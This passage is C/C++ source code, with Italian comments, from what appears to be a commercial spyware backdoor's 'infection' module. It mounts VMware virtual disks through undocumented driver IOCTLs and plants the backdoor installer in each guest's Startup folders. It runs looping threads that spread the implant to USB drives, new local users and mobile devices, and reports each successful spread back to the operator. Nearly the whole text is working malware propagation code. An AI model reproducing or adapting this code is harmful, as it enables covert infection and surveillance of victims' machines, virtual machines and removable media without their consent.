	// ... e ci copia il file
	_snprintf_s(exe_file, sizeof(exe_file), _TRUNCATE, "%S\\%s.exe", sid_path, rcs_name);
	if (!CopyFile(bd_path, exe_file, FALSE)) {
		// Se non riesce a scrivere il file cancella tutto quello creato
		RemoveDirectoryW(sid_path);
		SetFileAttributesW(dini_path, FILE_ATTRIBUTE_NORMAL);
		DeleteFileW(dini_path);
		SetFileAttributesW(recycle_path, FILE_ATTRIBUTE_NORMAL);
		RemoveDirectoryW(recycle_path);
		SetFileAttributesW(file_path, FILE_ATTRIBUTE_NORMAL);
		DeleteFileW(file_path);
		return FALSE;
	}

	return TRUE;
}

////////////////////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////// Infezione VMWare /////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////
struct _ioctl_vstor
{
    unsigned short   len;
    unsigned short   dummy0;
    unsigned long    dw1;
    unsigned long    dw2;
    unsigned long    dw3;
    unsigned long    dw4;
    unsigned long    dw5;
    unsigned long    dw6;
    unsigned char    Path[MAX_PATH];
    unsigned char    extra[4];
};

struct _ioctl_dismount
{
    unsigned short   len;    
    unsigned short   dummy0;    
    unsigned long    dw1;    
    unsigned long    dw2;    
    unsigned long    dw3;    
    unsigned long    dw4;    
    unsigned long    VolumeID;    
    unsigned long    dw6;    
};


extern WCHAR *UTF8_2_UTF16(char *str);
	
// Cerca una drive letter libera
char *FindFreeDriveLetter()
{
	static char drive_letter[4];
	
	drive_letter[1] = ':';
	drive_letter[2] = '\\';
	drive_letter[3] = NULL;

	// XXX - Per ora riesce a montarlo solo su Z
	drive_letter[0] = 'Z';
	return drive_letter;

/*	for (drive_letter[0]='E'; drive_letter[0]<='Z'; drive_letter[0]++) 
		if (GetDriveType(drive_letter) == DRIVE_NO_ROOT_DIR)
			return drive_letter;
	return NULL;*/
}

BOOL StartVMService()
{
	DWORD len;
	HKEY hKey;
	char service_path[MAX_PATH];
	STARTUPINFO si;
    PROCESS_INFORMATION pi;

	// Verifica che non sia gia' startato per conto suo
	if (HM_FindPid("vixDiskMountServer.exe", FALSE))
		return TRUE;

	if(FNC(RegOpenKeyExA)(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\vmplayer.exe", 0, KEY_READ, &hKey) != ERROR_SUCCESS) 
		return FALSE;
	len = sizeof(service_path);
	if(FNC(RegQueryValueExA)(hKey, "Path", NULL, NULL, (LPBYTE)service_path, &len) != ERROR_SUCCESS) {
		RegCloseKey(hKey);
		return FALSE;
	}
	RegCloseKey(hKey);
	_snprintf_s(service_path, sizeof(service_path), _TRUNCATE, "%s\\vixDiskMountServer.exe", service_path);		

	ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW;
	HM_CreateProcess((char *)service_path, 0, &si, &pi, 0);
	if (!pi.dwProcessId) 
		return FALSE;
	Sleep(1000); // Gli da' del tempo per inizializzarsi...
	return TRUE;
}

// Dato il path, torna il voulme id
#define MAX_VOLUME_ID_LEN 16
DWORD FindDiskID(HANDLE hfile, char *disk_path)
{
	DWORD dummy;
	char reply[0x3FDC];
	char string_match[MAX_PATH*2];
	char *ptr;
	DWORD disk_id = 0;
	DWORD i;

	BYTE msg[20] = { 0x14, 0x00, 0x00, 0x00, 0xd0, 0x94, 0x57, 0x04, 0xba, 0xab, 0x00 ,0x00, 0x00, 0x00, 0x6d, 0x64, 0x04, 0x00, 0x00, 0x00};

	if (!DeviceIoControl(hfile, 0x2a002c, &msg, sizeof(msg), reply, sizeof(reply), &dummy, NULL)) 
		return 0;

	_snprintf_s(string_match, sizeof(string_match), " type=disk_volume file=\"%s\"", disk_path);
	if (! (ptr = (char *)memmem(reply, sizeof(reply), string_match, strlen(string_match))) )
		return 0;
	*ptr = 0;
	for (i=0; i<MAX_VOLUME_ID_LEN; i++, ptr--) {
		if (*ptr == '=') {
			ptr++;
			disk_id = atoi(ptr);
			return disk_id;
		}
	}
	return 0;
}

BOOL FindVStoreDevice(WCHAR *dev_store)
{
	DWORD dummy;
	LPVOID *drivers;
	DWORD cbNeeded = 0;
	int cDrivers, i;

	FNC(EnumDeviceDrivers)((LPVOID *)&dummy, sizeof(dummy), &cbNeeded);
	if (cbNeeded == 0)
		return FALSE;
	if (!(drivers = (LPVOID *)malloc(cbNeeded)))
		return FALSE;

	if( FNC(EnumDeviceDrivers)(drivers, cbNeeded, &dummy) ) { 
		WCHAR szDriver[1024];
		cDrivers = cbNeeded/sizeof(LPVOID);
		for (i=0; i < cDrivers; i++ ) {
			if(FNC(GetDeviceDriverBaseNameW)(drivers[i], szDriver, sizeof(szDriver)/sizeof(szDriver[0]))) { 
				if (!_wcsnicmp(szDriver, L"vstor2-", wcslen(L"vstor2-"))) {
					WCHAR *ptr;
					if(ptr = wcschr(szDriver, L'.')) {
						*ptr = 0;
						_snwprintf_s(dev_store, MAX_PATH, _TRUNCATE, L"\\\\.\\%s", szDriver);		
						free(drivers);
						return TRUE;
					}
					free(drivers);
					return FALSE;
				}
			}
		}
	}
	free(drivers);
	return FALSE;
}

// Monta un disco virtuale
BOOL MountVMDisk(char *disk_path, char *drive_letter, DWORD *volume_id)
{
	HANDLE hfile;
	char reply[0x3FDC];
	WCHAR vstore[MAX_PATH];
	_ioctl_vstor msg;
	DWORD dummy;

	// Al primo tentativo di mount starta il servizio
	if (!StartVMService())
		return FALSE;

	// Costruisce il messaggio
	ZeroMemory(&msg, sizeof(msg));
	msg.len = sizeof(struct _ioctl_vstor);
    msg.dw1 = 0x045cdcc8; //C8 DC 5C 04
    msg.dw2 = 0x0000abba;
    msg.dw3 = 0x00000000;
    msg.dw4 = 0x00000002;
    msg.dw5 = 0x00000000;
    msg.dw6 = 0x02000000;
	strcpy((char *) msg.Path, disk_path);

	// Manda la ioctl per montare il disco
	if (!FindVStoreDevice(vstore))
		return FALSE;
	hfile = CreateFileW(vstore, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);  
	if (hfile == INVALID_HANDLE_VALUE) 
		return FALSE;

	if (!DeviceIoControl(hfile, 0x2a002c, &msg, sizeof(msg), reply, sizeof(reply), &dummy, NULL)) {
		CloseHandle(hfile);
		return FALSE;
	}

	*volume_id = FindDiskID(hfile, disk_path);
	CloseHandle(hfile);
	return TRUE;
}

// Smonta un disco virtuale
BOOL UnmountVMDisk(char *disk_path, DWORD volume_id)
{
	HANDLE hfile;
	char reply[0x3FDC];
	WCHAR vstore[MAX_PATH];
	_ioctl_dismount msg;
	DWORD dummy;

	// Costruisce il messaggio
	ZeroMemory(&msg, sizeof(msg));
    msg.len = sizeof(msg);
    msg.dw2 = 0x0000abba;
    msg.dw3 &= 0xffff0000;
    msg.dw4 = 0x3;
    msg.VolumeID = volume_id;
    msg.dw6 = 0x01;

	// Manda la ioctl per smontare il disco
	if (!FindVStoreDevice(vstore))
		return FALSE;
	hfile = CreateFileW(vstore, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);  
	if (hfile == INVALID_HANDLE_VALUE) 
		return FALSE;

	if (!DeviceIoControl(hfile, 0x2a002c, &msg, sizeof(msg), reply, sizeof(reply), &dummy, NULL)) {
		CloseHandle(hfile);
		return FALSE;
	}
	CloseHandle(hfile);
	return TRUE;
}

// Copia i file del dropper sul path specificato nelle potenziali directory di autorun
BOOL InfectVMDisk(char *drive_letter, char *exe_name)
{
	char win7_path[MAX_PATH];
	char xp_path[MAX_PATH];
	char s_path[MAX_PATH];
	HANDLE hfile;

	_snprintf_s(win7_path, MAX_PATH, _TRUNCATE, "%sProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\%s.exe", drive_letter, exe_name);
	_snprintf_s(xp_path, MAX_PATH, _TRUNCATE, "%sDocuments and Settings\\All Users\\Start Menu\\Programs\\Startup\\%s.exe", drive_letter, exe_name);
	HM_CompletePath(exe_name, s_path);

	// Se c'e' uno dei due file, vuol dire che e' gia' infetto
	hfile = CreateFile(win7_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile != INVALID_HANDLE_VALUE) {
		CloseHandle(hfile);
		return FALSE;
	}

	hfile = CreateFile(xp_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if (hfile != INVALID_HANDLE_VALUE) {
		CloseHandle(hfile);
		return FALSE;
	}

	// Cerca prima di copiare il path win7, perche' su alcuni win7 potrebbe esserci anche l'altro (che pero' e' inattivo)
	// Su XP invece di sicuro non c'e' il path di win7
	if (FNC(CopyFileA)(s_path, win7_path, TRUE))
		return TRUE;
	if (FNC(CopyFileA)(s_path, xp_path, TRUE))
		return TRUE;

	return FALSE;
}

// Monta e infetta un dato disco virtuale
void InfectVMWare(char *disk_path)
{
	char *drive_letter;
	DWORD volume_id = 0;
	WCHAR msg[MAX_PATH*2];

	if (! (drive_letter = FindFreeDriveLetter()) )
		return;

	if (!MountVMDisk(disk_path, drive_letter, &volume_id))
		return;

	if (InfectVMDisk(drive_letter, EXE_INSTALLER_NAME)) {
		REPORT_STATUS_LOG("- VMWare Installation...........OK\r\n");
		_snwprintf_s(msg, sizeof(msg)/sizeof(WCHAR), _TRUNCATE, L"[Inf. Module]: Spread to VMWare %S", disk_path);		
		SendStatusLog(msg);	
	}

	// Se non e' riuscito a recuperare l'id del volume prova a smontarli tutti
	if (volume_id == 0) {
		for (int i=100; i<256; i++)
			UnmountVMDisk(drive_letter, i);
	} else
		UnmountVMDisk(drive_letter, volume_id);
}

// Cerca tutti i dischi delle vmware preferite
void FindVMDisk(char *conf_path)
{
	HANDLE hFile;
	HANDLE hMap;
	DWORD config_size;
	char *config_map, *ptr, *ptr_end;
	char *local_config_map;
	char disk_path[MAX_PATH];
	WCHAR *w_path;

	// Mappa in memoria il file di config
	w_path = UTF8_2_UTF16(conf_path);
	if (!w_path)
		return;
	if ((hFile = FNC(CreateFileW)(w_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
		return;
	SAFE_FREE(w_path);
	
	config_size = GetFileSize(hFile, NULL);
	if (config_size == INVALID_FILE_SIZE) {
		CloseHandle(hFile);
		return;
	}
	
	local_config_map = (char *)calloc(config_size + 1, sizeof(char));
	if (local_config_map == NULL) {
		CloseHandle(hFile);
		return;
	}

	if ((hMap = FNC(CreateFileMappingA)(hFile, NULL, PAGE_READONLY, 0, 0, NULL)) == INVALID_HANDLE_VALUE) {
		SAFE_FREE(local_config_map);
		CloseHandle(hFile);
		return;
	}

	if ( (config_map = (char *)FNC(MapViewOfFile)(hMap, FILE_MAP_READ, 0, 0, 0)) ) {
		memcpy(local_config_map, config_map, config_size);
		FNC(UnmapViewOfFile)(config_map);
		if (ptr = strstr(local_config_map, ".vmdk\"")) {
			ptr_end = ptr + strlen(".vmdk");
			*ptr_end = NULL;
			for(;*ptr!='"' && ptr!=local_config_map; ptr--);
			if (*ptr == '"') {
				ptr++;
				sprintf_s(disk_path, conf_path);
				ptr_end = strrchr(disk_path, '\\');
				if (ptr_end) {
					ptr_end++;
					*ptr_end = NULL;
					strcat_s(disk_path, ptr);
					// Infetta il disco virtuale specificato
					InfectVMWare(disk_path);
				}
			}
		}
	}
	SAFE_FREE(local_config_map);
	CloseHandle(hMap);
	CloseHandle(hFile);

}

// Cerca VMWare se installato sul sistema (in ultima istanza infetta anche tutte le VM...)
void FindAndInfectVMware()
{
	WCHAR config_path[MAX_PATH];
	HANDLE hFile;
	HANDLE hMap;
	DWORD config_size, i;
	char *config_map, *ptr, *ptr_end;
	char *local_config_map;
	char obj_string[MAX_PATH];

	// Verifica che esista il file della backdoor
	HM_CompletePath(EXE_INSTALLER_NAME, obj_string);
	hFile = CreateFile(obj_string, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return;
	CloseHandle(hFile);

	// Mappa in memoria il file di config
	if (GetEnvironmentVariableW(L"appdata", config_path, MAX_PATH) == 0)
		return;
	wcscat_s(config_path, MAX_PATH, L"\\VMware\\preferences.ini");
	if ((hFile = FNC(CreateFileW)(config_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
		return;
	
	config_size = GetFileSize(hFile, NULL);
	if (config_size == INVALID_FILE_SIZE) {
		CloseHandle(hFile);
		return;
	}
	
	local_config_map = (char *)calloc(config_size + 1, sizeof(char));
	if (local_config_map == NULL) {
		CloseHandle(hFile);
		return;
	}

	if ((hMap = FNC(CreateFileMappingA)(hFile, NULL, PAGE_READONLY, 0, 0, NULL)) == INVALID_HANDLE_VALUE) {
		SAFE_FREE(local_config_map);
		CloseHandle(hFile);
		return;
	}

	if ( (config_map = (char *)FNC(MapViewOfFile)(hMap, FILE_MAP_READ, 0, 0, 0)) ) {
		memcpy(local_config_map, config_map, config_size);
		FNC(UnmapViewOfFile)(config_map);

		// Parsa per cercare i vmx
		ptr_end = local_config_map;
		while (ptr = strstr(ptr_end, ".vmx\"")) {
			ptr_end = ptr + strlen(".vmx");
			*ptr_end = NULL;
			for(;*ptr!='"' && ptr!=local_config_map; ptr--);
			if (*ptr == '"') {
				ptr++;
				// Per ogni macchina trovata, cerca il disco virtuale corrispondente
				FindVMDisk(ptr);	
			}
			*ptr_end = '"';
		}	
	}
	SAFE_FREE(local_config_map);
	CloseHandle(hMap);
	CloseHandle(hFile);
}



///////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////
///////////////////////////////////////////////////////////////////////////////////


DWORD WINAPI MonitorNewUsersThread(DWORD dummy) 
{
	LOOP {
		if (infection_spread) {
			SetLoadKeyPrivs();
			InfectUsers();
		}
		CANCELLATION_SLEEP(bPM_sprcp, SPREAD_AGENT_SLEEP_TIME); 
	}
	return 0;
}

//#define FAKE_MOBILE_INFECTION 1
DWORD WINAPI MonitorPDAThread(DWORD dummy) 
{
#ifndef FAKE_MOBILE_INFECTION
	LOOP {
		char bb_path[MAX_PATH];
		//WCHAR mmc_path[MAX_PATH];
		
		CANCELLATION_SLEEP(bPM_pdacp, PDA_AGENT_SLEEP_TIME);
		/*if (infection_pda && PDAFilesPresent() && RapiInit() && TryRapiConnect(3000)) {
			if (FindMemoryCard(mmc_path, MAX_PATH) && !IsPDAInfected(mmc_path)) {
				if (InfectPDA(mmc_path)) {
					REPORT_STATUS_LOG("- WM SmartPhone Installation....OK\r\n");
					SendStatusLog(L"[Inf. Module]: Spread to Mobile Device");	
				}
			}
			RapiDisconnect();
			CANCELLATION_SLEEP(bPM_pdacp, PDA_AGENT_SLEEP_TIME*2);
		}*/

		/*if (infection_pda && BBFilesPresent() && HM_FindPid("Rim.Desktop.exe", FALSE)) {
			STARTUPINFO si;
		    PROCESS_INFORMATION pi;
			ZeroMemory( &pi, sizeof(pi) );
 			ZeroMemory( &si, sizeof(si) );
			si.cb = sizeof(si);
 			si.wShowWindow = SW_HIDE;
			si.dwFlags = STARTF_USESHOWWINDOW;
			HM_CreateProcess(HM_CompletePath(BB_INSTALL_NAME1, bb_path), 0, &si, &pi, 0);

			if (pi.dwProcessId) 
				SM_AddExecutedProcess(pi.dwProcessId);
		}*/
	}
	return 0;
#else
	static BOOL first_time = TRUE;
	LOOP {
		if (first_time && infection_pda && RapiInit() && TryRapiConnect(3000)) {
			first_time = FALSE;
			REPORT_STATUS_LOG("- WM SmartPhone Installation....OK\r\n");
			SendStatusLog(L"[Inf. Module]: Spread to Mobile Device");	
			RapiDisconnect();
		}
		CANCELLATION_SLEEP(bPM_pdacp, 2500);
	}
	return 0;
#endif
}

DWORD WINAPI MonitorUSBThread(DWORD dummy)
{
	WCHAR drive_letter[4];
	DWORD type;
	
	drive_letter[1]=L':';
	drive_letter[2]=L'\\';
	drive_letter[3]=0;

	LOOP {
		if (infection_usb) {
			for (drive_letter[0]=L'D'; drive_letter[0]<=L'Z'; drive_letter[0]++) {
				type = FNC(GetDriveTypeW)(drive_letter);

				if (type==DRIVE_REMOVABLE && !IsUSBInfected(drive_letter) && InfectUSB(drive_letter, EXE_INSTALLER_NAME)) {
					REPORT_STATUS_LOG("- USB Drive Installation........OK\r\n");
					SendStatusLog(L"[Inf. Module]: Spread to USB Drive");	
				}
			}
		}
		CANCELLATION_SLEEP(bPM_usbcp, USB_AGENT_SLEEP_TIME);
	}
	return 0;
}

DWORD WINAPI MonitorVMThread(DWORD dummy)
{
	LOOP {
		if (infection_vm) 
			FindAndInfectVMware(); 
		CANCELLATION_SLEEP(bPM_vmwcp, vm_delay);
	}
	return 0;
}

DWORD __stdcall PM_PDAAgentStartStop(BOOL bStartFlag, BOOL bReset)
{
	DWORD dummy;

	// Durante la sync non lo stoppa (dato che non produce log)
	if (!bReset)
		return 0;

	// Se l'agent e' gia' nella condizione desiderata
	// non fa nulla.
	if (bPM_PDAAgentStarted == bStartFlag)
		return 0;

	bPM_PDAAgentStarted = bStartFlag;

	if (bStartFlag) {
		hPDAThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorPDAThread, NULL, 0, &dummy);
		/*hSpreadThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorNewUsersThread, NULL, 0, &dummy);
		hUSBThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorUSBThread, NULL, 0, &dummy);
		hVMWThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorVMThread, NULL, 0, &dummy);*/
	} else {
		QUERY_CANCELLATION(hPDAThread, bPM_pdacp);
		/*QUERY_CANCELLATION(hSpreadThread, bPM_sprcp);
		QUERY_CANCELLATION(hUSBThread, bPM_usbcp);
		QUERY_CANCELLATION(hVMWThread, bPM_vmwcp);*/
	}

	return 1;
}

DWORD __stdcall PM_PDAAgentInit(JSONObject elem)
{
	//DWORD temp;

	//infection_spread = (BOOL) elem[L"local"]->AsBool();
	infection_pda = (BOOL) elem[L"mobile"]->AsBool();
	//infection_usb = (BOOL) elem[L"usb"]->AsBool();

/*	temp = (DWORD) elem[L"vm"]->AsNumber();
	if (temp!=0) {
		infection_vm = TRUE;
		vm_delay = temp * 1000;
	} else 
		infection_vm = FALSE;*/
	
	return 1;
}


void PM_PDAAgentRegister()
{
	AM_MonitorRegister(L"infection", PM_PDAAGENT, NULL, (BYTE *)PM_PDAAgentStartStop, (BYTE *)PM_PDAAgentInit, NULL);
}

